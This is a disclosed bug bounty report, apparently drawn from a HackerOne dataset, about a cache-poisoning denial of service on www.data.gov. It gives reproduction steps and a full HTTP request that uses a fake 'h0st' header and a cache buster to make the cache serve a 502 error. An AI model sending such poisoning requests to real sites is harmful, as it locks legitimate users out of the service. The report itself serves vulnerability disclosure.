---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '930484'
original_report_id: '930484'
title: Denial of service via cache poisoning on https://www.data.gov/
team_handle: gsa_bbp
created_at: '2020-07-25T19:00:13.932Z'
disclosed_at: '2021-06-15T19:42:54.864Z'
has_bounty: false
visibility: full
substate: duplicate
vote_count: 11
asset_identifier: www.data.gov
asset_type: URL
max_severity: critical
tags:
- hackerone
---

# Denial of service via cache poisoning on https://www.data.gov/

## Metadata

- HackerOne Report ID: 930484
- Weakness: 
- Program: gsa_bbp
- Disclosed At: 2021-06-15T19:42:54.864Z
- Has Bounty: No
- Visibility: full
- Substate: duplicate

## Original Report

An attacker can persistently block access to any on https://www.data.gov/ by using cache poisoning with the h0st headers to cause
502 response code。

To replicate:
load https://www.data.gov/ in your browser.
look the burp ,  add ?xyzxyz=1 as cache buster , and add h0st headers h0st: wrtqvavjigwdvoqk in your burp.
load https://www.data.gov/?xyzxyz=1 in your browser. again.
and you win see 502 ERROR

{F922984}

To be more clearer, see my video
{F922983}

my http request：

```
GET /?xyzxyz=1 HTTP/1.1
Host: www.data.gov
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
h0st: wrtqvavjigwdvoqk
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

```


For more information on the theory behind this attack, check out https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning

Similar report：
https://hackerone.com/reports/622122
https://hackerone.com/reports/409370

## Impact

An attacker can persistently block access to any on https://www.data.gov/

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
